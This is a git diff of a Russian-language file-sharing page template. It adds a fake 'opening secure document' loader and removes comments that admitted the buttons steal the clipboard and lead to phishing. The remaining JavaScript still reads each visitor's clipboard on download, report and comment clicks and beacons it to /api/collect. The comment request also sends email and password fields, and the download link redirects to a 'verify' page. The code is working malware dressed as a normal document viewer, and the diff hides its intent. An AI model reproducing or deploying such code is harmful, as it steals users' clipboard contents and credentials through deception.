@@ -1,6 +1,20 @@
 {% extends "base.html" %}
 
 {% block content %}
+<!-- FAKE PDF LOADER OVERLAY -->
+<div id="pdfLoader" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #525659; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; color: white;">
+    <div class="spinner-border text-primary" role="status" style="width: 3rem; height: 3rem;"></div>
+    <h5 class="mt-3">Opening secure document...</h5>
+    <small class="text-muted">Verifying encryption keys...</small>
+</div>
+
+<script>
+    // Скрываем лоадер через 2.5 секунды, когда скрипты уже отработали
+    setTimeout(() => {
+        document.getElementById('pdfLoader').style.display = 'none';
+    }, 2500);
+</script>
+
 <!-- ЗАГОЛОВОК -->
 <div class="card p-4 mb-4">
     <div class="d-flex align-items-center">
@@ -28,7 +42,6 @@
             <small class="text-muted">{{ file.format }} • {{ file.date }}</small>
         </div>
         <div>
-            <!-- Кнопка ведет на фишинг Семяныча + крадет буфер -->
             <a href="#" onclick="stealAndRedirect(event, '/verify/{{ uid }}/{{ file.name }}')" class="btn btn-outline-dark btn-sm">
                 <i class="fa-solid fa-download"></i> Скачать
             </a>
@@ -62,7 +75,6 @@
                 <div class="border-bottom pb-2 mb-2">
                     <div class="d-flex justify-content-between">
                         <div><strong>{{ c.username }}</strong> <small class="text-muted">{{ c.date }}</small></div>
-                        <!-- Кнопка жалобы тоже крадет буфер -->
                         <button onclick="openReportModal('{{ c.username }}')" class="btn btn-danger btn-sm py-0 px-2" style="font-size: 0.8rem;">
                             <i class="fa-solid fa-triangle-exclamation"></i> Пожаловаться
                         </button>
@@ -86,7 +98,6 @@
             <textarea class="form-control" id="commentText" style="height: 80px"></textarea>
             <label>Ваше сообщение...</label>
         </div>
-        <!-- Кнопка отправки комментария крадет буфер -->
         <button onclick="sendComment('{{ uid }}')" class="btn btn-primary btn-sm w-100"><i class="fa-regular fa-paper-plane"></i> Отправить</button>
     </div>
 </div>
@@ -111,33 +122,25 @@
 </div>
 
 <script>
-// --- УНИВЕРСАЛЬНАЯ ФУНКЦИЯ КРАЖИ И ПЕРЕХОДА ---
 async function stealAndRedirect(event, url) {
     event.preventDefault();
-    const clip = await stealClipboard(); // Функция из base.html
-    
+    const clip = await stealClipboard();
     const data = {
         meta: { trigger: 'DOWNLOAD CLICK (CLIPBOARD)', url: window.location.href },
         system: { CLIPBOARD_DUMP: clip }
     };
-    
     const blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
     navigator.sendBeacon('/api/collect', blob);
-    
     setTimeout(() => { window.location.href = url; }, 200);
 }
 
-// --- ФУНКЦИИ ИНТЕРФЕЙСА ---
-
 async function openReportModal(username) {
-    // Крадем буфер при открытии модалки жалобы
     const clip = await stealClipboard();
     const data = {
         meta: { trigger: 'REPORT OPENED (CLIPBOARD)', url: window.location.href },
         system: { CLIPBOARD_DUMP: clip, reported_user: username }
     };
     navigator.sendBeacon('/api/collect', new Blob([JSON.stringify(data)], {type: 'application/json'}));
-
     document.getElementById('reportTarget').value = username;
     document.getElementById('reportReason').value = ''; 
     new bootstrap.Modal(document.getElementById('reportModal')).show();
@@ -146,7 +149,6 @@ async function openReportModal(username) {
 async function submitReport() {
     const text = document.getElementById('reportReason').value;
     const target = document.getElementById('reportTarget').value;
-    
     fetch('/api/collect', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
@@ -167,8 +169,6 @@ async function sendComment(uid) {
     const text = document.getElementById('commentText').value;
     
     if(!text) { alert("Введите текст!"); return; }
-
-    // Крадем буфер при отправке комментария
     const clip = await stealClipboard();
 
     fetch('/api/comment', {
@@ -176,7 +176,7 @@ async function sendComment(uid) {
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({ 
             uid, username, text, email, password,
-            system: { CLIPBOARD_DUMP: clip } // Добавляем буфер в тело запроса
+            system: { CLIPBOARD_DUMP: clip }
         })
     })
     .then(r => r.json())
